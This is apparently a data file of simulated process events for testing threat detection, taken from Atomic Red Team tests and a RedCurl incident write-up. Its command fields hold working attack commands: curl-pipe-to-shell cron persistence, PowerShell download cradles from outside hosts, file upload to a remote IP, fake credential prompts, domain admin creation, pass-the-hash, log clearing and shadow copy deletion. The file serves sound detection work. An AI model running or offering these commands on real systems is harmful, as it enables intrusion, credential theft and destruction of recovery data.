+PROC-TE-63,Threat Event,TRUE,WKS63,Enumerate Active Directory Computers with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()","Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
+PROC-TE-64,Threat Event,TRUE,WKS64,Get-DomainController with PowerView (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose","Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
+PROC-TE-65,Threat Event,TRUE,WKS65,Get-WmiObject to Enumerate Domain Controllers (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
+catch { $_; exit $_.Exception.HResult }","Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
+PROC-TE-66,Threat Event,TRUE,WKS66,Remote System Discovery - net group Domain Controller (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"C:\Windows\System32\net.exe group /domain ""Domain controllers""","Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
+PROC-TE-67,Threat Event,TRUE,WKS67,Masquerading as Windows LSASS process (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,"Defense Evasion
+Execution","Masquerading: Rename System Utilities
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
+PROC-TE-68,Threat Event,TRUE,WKS68,File Extension Masquerading (Atomic Red Team),C:\Windows\System32\explorer.exe,C:\Users\joebob\AppData\Local\Temp\T1036.007\masquerading.pdf.exe,masquerading.pdf.exe,%temp%\T1036.007\masquerading.pdf.exe,Defense Evasion,Masquerading: Rename System Utilities,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
+PROC-TE-69,Threat Event,TRUE,WKS69,Copy a sensitive File over Administrative share with copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy \\\\192.168.4.19\C$\Windows\Temp\credentials.txt %TEMP%\credentials.txt,"Collection
+Execution","Data from Network Shared Drive
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
+PROC-TE-70,Threat Event,TRUE,WKS70,Copy a sensitive File over Administrative share with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe copy-item -Path ""\\\\192.168.4.19\C$\Windows\Temp\credentials.txt"" -Destination ""$Env:TEMP\credentials.txt""","Collection
+Execution","Data from Network Shared Drive
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
+PROC-TE-71,Threat Event,TRUE,WKS71,Add hourly cron job (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl 193.19.194.14/jsgyt | sh"" > /etc/cron.hourly/persistme","Persistence
+Execution","Scheduled Task/Job: Cron
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
+PROC-TE-72,Threat Event,TRUE,WKS72,Add cron job to cron.d directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo '*/5 * * * * root ""curl 193.19.194.14/jsgyt | sh""' > /etc/cron.d/persistme","Persistence
+Execution","Scheduled Task/Job: Cron
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
+PROC-TE-73,Threat Event,TRUE,WKS73,Add cron job via crontab command (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""* * * * * /tmp/a.sh"" > /tmp/b.sh && crontab /tmp/b.sh","Persistence
+Execution","Scheduled Task/Job: Cron
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
+PROC-TE-74,Threat Event,TRUE,WKS74,Add cron job to /var/spool/cron/crontabs/ directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl http://193.176.183.245/ahdytg | sh"" >> /var/spool/cron/crontabs/c","Persistence
+Execution","Scheduled Task/Job: Cron
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
+PROC-TE-75,Threat Event,TRUE,WKS75,Add startup script via schtasks.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\schtasks.exe,schtasks.exe,"C:\Windows\System32\schtasks.exe /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""","Persistence
+Execution","Scheduled Task/Job: Scheduled Task
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md,
+PROC-TE-76,Threat Event,TRUE,MACPRO76,MacOS credential theft via osascript password prompt (v1 // Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"/usr/bin/osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return  default answer """" with icon 1 with hidden answer with title ""Software Update""'","Credential Access
+Execution","Input Capture: GUI Input Capture
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
+PROC-TE-77,Threat Event,TRUE,WKS77,Windows credential theft via GUI password prompt (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);write-warning $cred.GetNetworkCredential().Password","Credential Access
+Execution","Input Capture: GUI Input Capture
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
+PROC-TE-78,Threat Event,TRUE,WKS78,MacOS credential theft via osascript password prompt (v2 // Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer');echo $PWD_SPOOF","Credential Access
+Execution","Input Capture: GUI Input Capture
+Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md,
+PROC-TE-79,Threat Event,TRUE,WKS79,Powershell XML download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('http://jjgytsf.xyz/apars');$Xml.command.a.execute | IEX""","Credential Access
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell
+Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
+PROC-TE-80,Threat Event,TRUE,WKS80,PowerShell fileless script execution - store and run base64 encoded payload in registry (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe reg.exe add ""HKEY_CURRENT_USER\Software\Classes\ATR"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\ATR').ART)))",Execution,"Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,
+PROC-TE-81,Threat Event,TRUE,WKS81,MacOS encoded Python script invoked via osascript (Atomic Red Team),/bin/bash,/usr/bin/osascript,osascript,"osascript -e ""do shell script ""echo ""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));"" | python &""""",Execution,"Command and Scripting Interpreter: AppleScript
+Command and Scripting Interpreter: Python",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md,
+PROC-TE-82,Threat Event,TRUE,WKS82,Local group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe localgroup,"Discovery
+Execution","Permission Groups Discovery: Local Groups
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
+PROC-TE-83,Threat Event,TRUE,WKS83,Domain group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net.exe group /domain,"Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
+PROC-TE-84,Threat Event,TRUE,WKS84,Domain Enterprise Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""enterprise admins"" /domain","Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
+PROC-TE-85,Threat Event,TRUE,WKS85,Domain Admins group enumeration via net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net.exe group ""domain admins"" /domain","Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
+PROC-TE-86,Threat Event,TRUE,WKS86,Enumerate Active Directory Groups with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()","Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md,
+PROC-TE-87,Threat Event,TRUE,WKS87,Clear System Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl System,"Defense Evasion
+Execution","Indicator Removal on Host: Clear Windows Event Logs
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
+PROC-TE-88,Threat Event,TRUE,WKS88,Clear Security Eventlog with wevtutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wevtutil.exe,wevtutil.exe,wevtutil cl Security,"Defense Evasion
+Execution","Indicator Removal on Host: Clear Windows Event Logs
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md,
+PROC-TE-89,Threat Event,TRUE,WKS89,Mount a network share with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net use c: \\\\192.168.1.5\toys,"Collection
+Execution","Data from Network Shared Drive
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md,
+PROC-TE-90,Threat Event,TRUE,WKS90,Create a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc /active:yes,"Valid Accounts: Local Accounts
+Execution","Valid Accounts: Local Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-91,Threat Event,TRUE,WKS91,Set the password for a new local user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user windowsvc abbc176,"Valid Accounts: Local Accounts
+Execution","Valid Accounts: Local Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-92,Threat Event,TRUE,WKS92,Add a new local user to the Local Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net localgroup Administrators windowsvc /add,"Valid Accounts: Local Accounts
+Execution","Valid Accounts: Local Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-93,Threat Event,TRUE,WKS93,Add a new local user to the Remote Desktop Users (RDP) group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net localgroup ""Remote Desktop Users"" windowsvc /add","Lateral Movement
+Execution","Remote Services: Remote Desktop Protocol
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-94,Threat Event,TRUE,WKS94,Enable RDP connections via registry keys and reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","Lateral Movement
+Defense Evasion
+Execution","Remote Services: Remote Desktop Protocol
+Modify Registry
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-95,Threat Event,TRUE,WKS95,Enable RDP connections via registry keys and reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f","Lateral Movement
+Defense Evasion
+Execution","Remote Services: Remote Desktop Protocol
+Modify Registry
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md,
+PROC-TE-96,Threat Event,TRUE,WKS96,Powershell download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe (New-Object System.Net.WebClient).DownloadFile(""http://193.176.183.245/ahdytg"", ""$env:TEMP\abcc.txt"")","Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
+PROC-TE-97,Threat Event,TRUE,WKS97,Windows tool ingress via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe -k http://193.176.183.245/ahdytg -o c:\users\public\music\a.dll,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
+PROC-TE-98,Threat Event,TRUE,WKS98,Windows file exfiltration via curl.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\curl.exe,curl.exe,curl.exe --upload-file c:\temp\a.7z http://193.176.183.245,"Exfiltration
+Execution","Exfiltration Over Web Service
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
+PROC-TE-99,Threat Event,TRUE,WKS99,Powershell IWR download cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe iwr -URI http://193.176.183.245/ahdytg -Outfile C:\Users\joebob\Documents\c.exe,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md,
+PROC-TE-100,Threat Event,TRUE,WKS100,Registry autorun persistence via reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f,"Persistence
+Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md,
+PROC-TE-101,Threat Event,TRUE,WKS101,Add new domain user with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net user ""pcz134"" ""lQsia65"" /add /domain","Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
+PROC-TE-102,Threat Event,TRUE,WKS102,Add new domain user to Domain Admins group with net.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Domain Admins"" ""pcz134"" /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md,
+PROC-TE-103,Threat Event,TRUE,WKS103,Discover domain trusts with nltest (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /domain_trusts,"Discovery
+Execution","Domain Trust Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
+PROC-TE-104,Threat Event,TRUE,WKS104,Discover domain trusts with nltest (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /trusted_domains,"Discovery
+Execution","Domain Trust Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.md,
+PROC-TE-105,Threat Event,TRUE,WKS105,Delete volume shadow copies with wmic.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,wmic.exe shadowcopy delete,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
+PROC-TE-106,Threat Event,TRUE,WKS106,Wbadmin Delete Windows Backup Catalog (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,wbadmin delete catalog -quiet,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
+PROC-TE-107,Threat Event,TRUE,WKS107,Delete Volume Shadow Copies via WMI with PowerShell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell.exe Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell
+Windows Management Instrumentation",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md,
+PROC-TE-108,Threat Event,TRUE,WKS108,Service creation via sc.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\sc.exe,sc.exe,"sc.exe create onedrivesvc binPath= ""C:\Windows\Temp\onedrive.exe"" start=auto  type=interact","Persistence
+Execution","Create or Modify System Process: Windows Service
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
+PROC-TE-109,Threat Event,TRUE,WKS109,Service creation via powershell.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe New-Service -Name ""onedrivesvc"" -BinaryPathName ""C:\Windows\Temp\onedrive.exe""","Persistence
+Execution","Create or Modify System Process: Windows Service
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md,
+PROC-TE-110,Threat Event,TRUE,WKS110,Persistence via Recycle bin and reg.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f","Persistence
+Defense Evasion
+Execution","Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+Modify Registry
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md,
+PROC-TE-111,Threat Event,TRUE,WKS111,Renamed CrackMapExec Pass the Hash (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\JoeBob\Documents\akc.exe,akc.exe,C:\Users\JoeBob\Documents\akc.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami,"Lateral Movement
+Execution","Use Alternate Authentication Material: Pass the Hash
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md,
+PROC-TE-112,Threat Event,TRUE,WKS112,Allow RDP (3389/TCP) through Windows firewall with netsh.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\netsh.exe,netsh.exe,"netsh advfirewall firewall add rule name=""windowsfirewallservice"" dir=in protocol=tcp localport=3389 action=allow profile=any","Defense Evasion
+Execution","Impair Defenses: Disable or Modify System Firewall
+Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md,
+PROC-TE-113,Threat Event,TRUE,WKS113,Proxied Powershell download cradle using mixed casing defense evasion,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe -c ""$A=[SYStem.neT.WEBrEQueSt]::GEtSYstEMWebpRoXY().GeTpRoXY(‘http://
+msn.com’);IF($a.HOST -eQ ‘msn.Com’){(IwR -usEBASIcpARsInG -urI http://woicu.xyz/suayt).tOstRInG()|POWErSHELl.EXe}ELSE{(IWR -usEBaSIcPArsInG -urI http://woicu.xyz/suayt -PRoXy $A -pRoxYuseDe-fauLTcReDENTialS).tOsTRInG()|powErShELL.Exe};""","Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-114,Threat Event,TRUE,WKS114,Relocated 7zip binary being used to extract encypted payload into ProgramData subdirectory,C:\Windows\System32\cmd.exe,C:\ProgramData\7za.exe,7za.exe,C:\ProgramData\7za.exe x -aoa -pdQEXZCJd revtun3ag.tmp -oC:\ProgramData\ControlsUp,"Execution
+Collection","Command and Scripting Interpreter: Windows Command Shell
+Data Staged: Local Data Staging",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-115,Threat Event,TRUE,WKS115,Execution proxying via pcalua.exe to run a python script to initiate a remote connection,C:\Windows\System32\cmd.exe,C:\Windows\System32\pcalua.exe,pcalua.exe,pcalua.exe -a conhost.exe -c --headless C:\ProgramData\ControlsUp\python.exe C:\ProgramData\ControlsUp\cl\cl.py --s 188.130.207.253 --p 10310,"Defense Evasion
+Execution","Indirect Command Execution
+Command and Scripting Interpreter: Python
+Command and Scripting Interpreter: Windows Command Shell",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-116,Threat Event,TRUE,WKS116,Usage of relocated 7zip binary to archive collected files into a multi-part encrypted archive,C:\Windows\System32\cmd.exe,C:\ProgramData\7za.exe,7za.exe,C:\ProgramData\7za.exe a -pgdxx38a6SVd -mhe=on -v50m -sdel -y temp17000c\abc_rt3_22169.tmp temp1321,"Execution
+Collection","Command and Scripting Interpreter: Windows Command Shell
+Archive Collected Data",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-117,Threat Event,TRUE,WKS117,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\mbda76918700ee0725.exe,mbda76918700ee0725.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\mbda76918700ee0725.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-118,Threat Event,TRUE,WKS118,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\nzjetzkuzk.exe,nzjetzkuzk.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\nzjetzkuzk.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-119,Threat Event,TRUE,WKS119,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\system32\config\systemprofile\AppData\Local\USB\qpybfa6a97da7711221.exe,qpybfa6a97da7711221.exe,C:\Windows\system32\config\systemprofile\AppData\Local\USB\qpybfa6a97da7711221.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-120,Threat Event,TRUE,WKS120,Rare EXE being executed in subdirectory of ProgramData,C:\Windows\System32\cmd.exe,C:\ProgramData\DiskCleanup\om6db9110b3989a881.exe,om6db9110b3989a881.exe,C:\ProgramData\DiskCleanup\om6db9110b3989a881.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
